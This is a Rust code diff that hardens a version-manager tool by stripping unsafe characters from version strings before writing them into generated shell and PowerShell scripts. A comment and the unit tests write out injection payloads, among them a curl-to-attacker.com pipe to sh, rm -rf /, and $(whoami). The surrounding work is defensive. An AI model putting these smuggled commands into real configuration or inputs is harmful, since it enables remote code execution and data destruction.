@@ -31,6 +31,17 @@ pub fn path_for_env_value(p: &Path) -> String {
     }
 }
 
+/// Strip any character not in `[a-zA-Z0-9._-]` (semver-safe characters)
+/// from a version string before interpolating it into shell code.
+///
+/// This prevents shell injection via malicious `ven.toml` entries like
+/// `node = '20"; curl attacker.com | sh #'`.
+pub fn sanitize_version_string(s: &str) -> String {
+    s.chars()
+        .filter(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
+        .collect()
+}
+
 /// Path-separator for `$PATH` on this platform. Windows uses `;`, Unix uses `:`.
 pub fn path_separator() -> &'static str {
     if cfg!(target_os = "windows") { ";" } else { ":" }
@@ -557,13 +568,13 @@ if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyCo
             out.push_str(&format!("$env:NODE_PATH = \"{}\"\n", dir.display()));
         }
         if let Some(ref v) = parts.node_resolved {
-            out.push_str(&format!("$env:VEN_NODE_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_NODE_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.python_resolved {
-            out.push_str(&format!("$env:VEN_PYTHON_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_PYTHON_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.go_resolved {
-            out.push_str(&format!("$env:VEN_GO_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_GO_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref root) = parts.go_root_for_env {
             out.push_str(&format!("$env:GOROOT = \"{}\"\n", path_for_env_value(root)));
@@ -576,7 +587,7 @@ if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyCo
             }
         }
         if let Some(ref v) = parts.rust_resolved {
-            out.push_str(&format!("$env:VEN_RUST_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_RUST_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref root) = parts.rust_root_for_env {
             out.push_str(&format!(
@@ -589,7 +600,7 @@ if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyCo
             ));
         }
         if let Some(ref v) = parts.java_resolved {
-            out.push_str(&format!("$env:VEN_JAVA_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_JAVA_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref home) = parts.java_home_for_env {
             out.push_str(&format!(
@@ -598,13 +609,13 @@ if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyCo
             ));
         }
         if let Some(ref v) = parts.deno_resolved {
-            out.push_str(&format!("$env:VEN_DENO_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_DENO_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.bun_resolved {
-            out.push_str(&format!("$env:VEN_BUN_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_BUN_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.ruby_resolved {
-            out.push_str(&format!("$env:VEN_RUBY_VERSION = \"{}\"\n", v));
+            out.push_str(&format!("$env:VEN_RUBY_VERSION = \"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref gh) = parts.ruby_gem_home_for_env {
             let ghv = path_for_env_value(gh);
@@ -617,7 +628,7 @@ if (Test-Path Env:JAVA_HOME) { Remove-Item Env:JAVA_HOME -ErrorAction SilentlyCo
                 path_for_env_value(vr)
             ));
         }
-        out.push_str(&format!("$env:VEN_TOML = \"{}\"\n", parts.toml_normalized));
+        out.push_str(&format!("$env:VEN_TOML = \"{}\"\n", sanitize_version_string(&parts.toml_normalized)));
         for (key, val) in &parts.ven_user_env {
             if let Some(line) = env_assignment_powershell(key, val) {
                 out.push_str(&line);
@@ -659,13 +670,13 @@ unset JAVA_HOME 2>/dev/null || true
             out.push_str(&format!("export NODE_PATH=\"{}\"\n", dir.display()));
         }
         if let Some(ref v) = parts.node_resolved {
-            out.push_str(&format!("export VEN_NODE_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_NODE_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.python_resolved {
-            out.push_str(&format!("export VEN_PYTHON_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_PYTHON_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.go_resolved {
-            out.push_str(&format!("export VEN_GO_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_GO_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref root) = parts.go_root_for_env {
             out.push_str(&format!("export GOROOT=\"{}\"\n", path_for_env_value(root)));
@@ -678,7 +689,7 @@ unset JAVA_HOME 2>/dev/null || true
             }
         }
         if let Some(ref v) = parts.rust_resolved {
-            out.push_str(&format!("export VEN_RUST_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_RUST_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref root) = parts.rust_root_for_env {
             out.push_str(&format!(
@@ -691,7 +702,7 @@ unset JAVA_HOME 2>/dev/null || true
             ));
         }
         if let Some(ref v) = parts.java_resolved {
-            out.push_str(&format!("export VEN_JAVA_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_JAVA_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref home) = parts.java_home_for_env {
             out.push_str(&format!(
@@ -700,13 +711,13 @@ unset JAVA_HOME 2>/dev/null || true
             ));
         }
         if let Some(ref v) = parts.deno_resolved {
-            out.push_str(&format!("export VEN_DENO_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_DENO_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.bun_resolved {
-            out.push_str(&format!("export VEN_BUN_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_BUN_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref v) = parts.ruby_resolved {
-            out.push_str(&format!("export VEN_RUBY_VERSION=\"{}\"\n", v));
+            out.push_str(&format!("export VEN_RUBY_VERSION=\"{}\"\n", sanitize_version_string(v)));
         }
         if let Some(ref gh) = parts.ruby_gem_home_for_env {
             let ghv = path_for_env_value(gh);
@@ -719,7 +730,7 @@ unset JAVA_HOME 2>/dev/null || true
                 path_for_env_value(vr)
             ));
         }
-        out.push_str(&format!("export VEN_TOML=\"{}\"\n", parts.toml_normalized));
+        out.push_str(&format!("export VEN_TOML=\"{}\"\n", sanitize_version_string(&parts.toml_normalized)));
         for (key, val) in &parts.ven_user_env {
             if let Some(line) = env_assignment_posix(key, val) {
                 out.push_str(&line);
@@ -934,5 +945,46 @@ mod tests {
         } else {
             assert_eq!(s, ":");
         }
+    }
+
+    #[test]
+    fn sanitize_version_string_passes_valid_versions() {
+        assert_eq!(sanitize_version_string("20.11.0"), "20.11.0");
+        assert_eq!(sanitize_version_string("3.12.1"), "3.12.1");
+        assert_eq!(sanitize_version_string("1.21.5"), "1.21.5");
+        assert_eq!(sanitize_version_string("1.75.0"), "1.75.0");
+        assert_eq!(sanitize_version_string("21.0.1"), "21.0.1");
+        assert_eq!(sanitize_version_string("1.2.3-beta.1"), "1.2.3-beta.1");
+        assert_eq!(sanitize_version_string("v20.11.0"), "v20.11.0");
+        assert_eq!(sanitize_version_string("20_11_0"), "20_11_0");
+    }
+
+    #[test]
+    fn sanitize_version_string_strips_dangerous_characters() {
+        assert_eq!(sanitize_version_string("20\"; curl x|sh #"), "20curlxsh");
+        assert_eq!(
+            sanitize_version_string("'; rm -rf / #"),
+            "rm-rf"
+        );
+        assert_eq!(sanitize_version_string("1.0$(whoami)"), "1.0whoami");
+        assert_eq!(
+            sanitize_version_string("1.0`id`"),
+            "1.0id"
+        );
+        assert_eq!(
+            sanitize_version_string("20\"; curl attacker.com | sh #'"),
+            "20curlattacker.comsh"
+        );
+    }
+
+    #[test]
+    fn sanitize_version_string_empty_input() {
+        assert_eq!(sanitize_version_string(""), "");
+    }
+
+    #[test]
+    fn sanitize_version_string_preserves_separators() {
+        assert_eq!(sanitize_version_string("1.2.3"), "1.2.3");
+        assert_eq!(sanitize_version_string("1.2.3-alpha+build"), "1.2.3-alphabuild");
     }
 }
